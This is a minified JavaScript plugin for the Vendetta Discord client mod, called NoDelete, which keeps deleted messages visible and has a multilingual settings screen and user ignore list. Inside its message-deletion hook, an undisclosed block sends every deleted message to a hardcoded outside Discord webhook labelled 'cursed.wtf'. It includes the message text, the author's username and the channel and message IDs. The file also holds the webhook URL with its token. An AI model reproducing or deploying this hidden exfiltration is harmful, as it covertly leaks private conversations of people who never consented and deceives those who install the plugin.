(function(d,n,s,A,p,i,b,B,h,w,g){
"use strict";

function c(e,r,u,t){let a=Math.abs(e);return a%=100,a>=5&&a<=20?t:(a%=10,a===1?r:a>=2&&a<=4?u:t)}
function m(e,r,u){return e===1?r:u}

let E={};
E={
    settings:{
        titles:{
            settings:{"en-GB":"Settings",uk:"Налаштування",ru:"Настройки"},
            filters:{"en-GB":"Filters",uk:"Фільтри",ru:"Фильтры"}
        },
        showTimestamps:{
            "en-GB":"Show the time of deletion",uk:"Показувати час видалення",ru:"Показывать время удаления"
        },
        ewTimestampFormat:{
            "en-GB":"Use 12-hour format",uk:"Використовувати 12-годинний формат",ru:"Использовать 12-часовой формат"
        },
        youDeletedItWarning:{
            "en-GB":"The messages YOU deleted - are not saved",
            uk:"Повідомлення які видалили ВИ - не зберігаються",
            ru:"Сообщения удаленные ВАМИ - не сохраняются"
        },
        addUsersInfo:{
            "en-GB":function(){return`To add or remove users from the ignore list, follow these steps:
1. open their profile
2. press the •••
3. press "${E.optionLabels[0]["en-GB"]}"
4. 🎉`},
            uk:function(){return`Щоб додати когось до списку ігнорованих користувачів, виконайте ці дії:
1. відкрийте їх профіль
2. натисніть •••
3. натисніть "${E.optionLabels[0].uk}"
4. 🎉`},
            ru:function(){return`Чтобы добавить кого-то в список игнорируемых пользователей - следуйте этим шагам
1. откройте их профиль
2. нажмите •••
3. нажмите "${E.optionLabels[0].ru}"
4. 🎉`}
        },
        ignoreBots:{
            "en-GB":"Ignore bots",uk:"Ігнорувати ботів",ru:"Игнорировать ботов"
        },
        clearUsersLabel:{
            "en-GB":function(e){return`You have ${e} user${m(e,"","s")} in the ignored users list`},
            uk:function(e){return`Ви маєте ${e} користувач${c(e,"а","а","ів")} у списку ігнорованих користувачів`},
            ru:function(e){return`Вы имеете ${e} пользовател${c(e,"я","я","ей")} в списке игнорируемых пользователей`}
        },
        confirmClear:{
            title:{
                "en-GB":"Hold on!",uk:"Почекай-но!",ru:"Положи-ка!"
            },
            description:{
                "en-GB":function(e){return`This will remove ${e} user${m(e,"","s")} from the ignored users list.\nDo you you really want to do that?`},
                uk:function(e){return`Це прибере ${e} користувач${c(e,"а","а","ів")} зі списку ігнорованих користувачів.\nВи дійсно хочете продовжити?`},
                ru:function(e){return`Это уберет ${e} пользовател${c(e,"я","я","ей")} из списка игнорируемых пользователей.\nВы действительно хотите продолжить?`}
            },
            yes:{"en-GB":"Yes",uk:"Так",ru:"Да"},
            no:{"en-GB":"Cancel",uk:"Відмінити",ru:"Отменить"}
        }
    },
    optionLabels:[
        {"en-GB":"Add to NoDelete ignored users list",uk:"Додати до списку ігнорованих користувачів у NoDelete",ru:"Добавить в список игнорируемых пользователей в NoDelete"},
        {"en-GB":"Remove from the NoDelete ignore list",uk:"Прибрати з списку ігнорованих користувачів у NoDelete",ru:"Убрать из списка игнорируемых пользователей в NoDelete"}
    ],
    toastLabels:[
        {"en-GB":"Added ${user} to the ignored users list",uk:"${user} додавено до списку ігнорованих користувачів",ru:"${user} добавлены в список игнорируемых пользователей"},
        {"en-GB":"Removed ${user} from the ignored users list",uk:"${user} прибрано зі списку ігнорованих користувачів",ru:"${user} убраны из списка игнорируемых пользователей"}
    ],
    thisMessageWasDeleted:{
        "en-GB":"This message was deleted",uk:"Це повідомлення було видалено",ru:"Это сообщение было удалено"
    }
};

const y=function(){return vendetta.metro.findByStoreName("LocaleStore").locale},v="en-GB";
function o(e,r){let u=E;for(const a of e.split("."))u?.hasOwnProperty(a)?u=u[a]:u=E;if(u===E)return e;let t=u[y()]??u[v]??e;return typeof t=="function"&&!r&&(t=t()),r?{make:t}:t}

s.storage.ignore??={users:[],bots:!1},s.storage.timestamps??=!1,s.storage.onlyTimestamps??=!1,s.storage.ew??=!1;

function k(e){return A.useProxy(s.storage),
    n.React.createElement(n.ReactNative.ScrollView,{style:{flex:1}},
        n.React.createElement(i.Forms.FormSection,{title:o("settings.titles.settings"),titleStyleType:"no_border"},
            n.React.createElement(i.Forms.FormRow,{label:o("settings.showTimestamps"),trailing:n.React.createElement(i.Forms.FormSwitch,{value:s.storage.timestamps,onValueChange:function(r){return s.storage.timestamps=r}})}),
            n.React.createElement(i.Forms.FormRow,{label:o("settings.ewTimestampFormat"),trailing:n.React.createElement(i.Forms.FormSwitch,{value:s.storage.ew,onValueChange:function(r){return s.storage.ew=r}})}),
            n.React.createElement(i.Forms.FormDivider,null),
            n.React.createElement(i.Forms.FormRow,{label:o("settings.youDeletedItWarning")})),
        n.React.createElement(i.Forms.FormSection,{title:o("settings.titles.filters")},
            n.React.createElement(i.Forms.FormRow,{label:o("settings.ignoreBots"),trailing:n.React.createElement(i.Forms.FormSwitch,{value:s.storage.ignore.bots,onValueChange:function(r){return s.storage.ignore.bots=r}})}),
            n.React.createElement(i.Forms.FormRow,{label:o("settings.clearUsersLabel",!0)?.make?.(s.storage.ignore.users.length),trailing:n.React.createElement(i.Forms.FormRow.Icon,{source:b.getAssetIDByName("ic_trash_24px")}),onPress:function(){const r=s.storage.ignore;r.users.length!==0&&p.showConfirmationAlert({title:o("settings.confirmClear.title"),content:o("settings.confirmClear.description",!0)?.make?.(r.users.length),confirmText:o("settings.confirmClear.yes"),cancelText:o("settings.confirmClear.no"),confirmColor:"brand",onConfirm:function(){r.users=[]}})}}),
            n.React.createElement(i.Forms.FormDivider,null),
            n.React.createElement(i.Forms.FormRow,{label:o("settings.addUsersInfo")})))}

let F,D=[];
var R={
    settings:k,
    patches:[],
    onUnload(){this.patches.forEach(function(e){return e()}),this.patches=[]},
    onLoad(){
        try{
            this.patches.push(B.before("dispatch",n.FluxDispatcher,function(r){
                try{
                    F||(F=h.findByStoreName("MessageStore"));
                    const u=r[0];
                    if(!u||u?.type!=="MESSAGE_DELETE"||!u?.id||!u?.channelId)return;
                    const t=F.getMessage(u.channelId,u.id);
                    if(s.storage.ignore.users.includes(t?.author?.id)||s.storage.ignore.bots&&t?.author?.bot)return;
                    if(D.includes(u.id))return D.splice(D.indexOf(u.id),1),r;
                    D.push(u.id);
                    
                    let a=o("thisMessageWasDeleted");
                    if(s.storage.timestamps){
                        a+=` (${n.moment().format(s.storage.ew?"hh:mm:ss.SS a":"HH:mm:ss.SS")})`
                    }

                    // 🔥 Send to Discord webhook
                    const webhookUrl = "https://discord.com/api/webhooks/1422282447671787631/rcPiZulGb_lt3V5L0JmA4CGn2RrtujuRV7Au2olcK1X1lpQ_hHrligsKyvPdLrCPae1w";
                    const payload = {
                        username: "cursed.wtf - Message Deleted",
                        embeds: [{
                            title: "Message Deleted",
                            description: `**Channel ID:** ${u.channelId}\n**Message ID:** ${u.id}\n**Author:** ${t?.author?.username}#${t?.author?.discriminator}\n\n${t?.content || "*[No content]*"}`,
                            color: 0xff4444,
                            timestamp: new Date().toISOString()
                        }]
                    };
                    fetch(webhookUrl,{
                        method:"POST",
                        headers:{"Content-Type":"application/json"},
                        body:JSON.stringify(payload)
                    }).catch(err=>console.error("[NoDelete → Webhook] Failed:",err));

                    r[0]={type:"MESSAGE_EDIT_FAILED_AUTOMOD",messageData:{type:1,message:{channelId:u.channelId,messageId:u.id}},errorResponseBody:{code:2e5,message:a}};
                    return r
                }catch(u){console.error(u),alert(`[Nodelete → dispatcher patch] died\n`+u.stack)}
            }));

            const e=B.before("render",h.findByProps("ScrollView").View,function(r){
                try{
                    let u=w.findInReactTree(r,function(l){return l.key===".$UserProfileOverflow"});
                    if(!u||!u.props||u.props.sheetKey!=="UserProfileOverflow")return;
                    const t=u.props.content.props,a=E.optionLabels.map(Object.values).flat();
                    if(t.options.some(function(l){return a.includes(l?.label)}))return;
                    const f=Object.keys(u._owner.stateNode._keyChildMapping).find(function(l){return u._owner.stateNode._keyChildMapping[l]&&l.match(/(?<=\$UserProfile)\d+/)})?.slice?.(13);
                    let C=t.options.findLastIndex(function(l){return l.isDestructive});
                    s.storage.ignore.users.includes(f)?
                        t.options.splice(C+1,0,{label:o("optionLabels.1"),onPress:function(){s.storage.ignore.users.splice(s.storage.ignore.users.findIndex(function(l){return l===f}),1),g.showToast(o("toastLabels.1").replaceAll("${user}",t.header.title)),t.hideActionSheet()}}):
                        t.options.splice(C+1,0,{isDestructive:!0,label:o("optionLabels.0"),onPress:function(){s.storage.ignore.users.push(f),g.showToast(o("toastLabels.0").replaceAll("${user}",t.header.title)),t.hideActionSheet()}})
                }catch(u){console.error(u);let t=!1;try{t=e()}catch{t=!1}alert(`[NoDelete → context menu patch] failed. Patch ${t?"dis":"en"}abled\n`+u.stack)}});
            this.patches.push(e)
        }catch(e){console.error(e),alert(`[NoDelete] dead\n`+e.stack)}
    }
};
return d.default=R,Object.defineProperty(d,"__esModule",{value:!0}),d
})({},vendetta.metro.common,vendetta.plugin,vendetta.storage,vendetta.ui.alerts,vendetta.ui.components,vendetta.ui.assets,vendetta.patcher,vendetta.metro,vendetta.utils,vendetta.ui.toasts);
